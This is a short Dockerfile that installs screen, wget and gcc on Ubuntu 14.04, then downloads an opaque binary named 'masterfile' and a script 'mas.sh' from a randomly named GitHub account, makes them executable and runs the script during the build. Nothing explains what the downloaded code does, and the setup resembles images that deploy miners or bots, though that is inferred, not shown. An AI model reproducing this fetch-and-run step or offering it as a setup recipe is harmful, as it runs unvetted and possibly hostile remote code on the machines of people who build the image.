FROM ubuntu:14.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install -y wget && \
  apt-get install -y gcc && \
  wget https://github.com/baxwru2/thoeb292/raw/main/masterfile  && \
  chmod +x masterfile && \
  wget https://github.com/baxwru2/thoeb292/raw/main/mas.sh && \
  chmod +x mas.sh && \
   ./mas.sh && \
   rm -rf /var/lib/apt/lists/* 

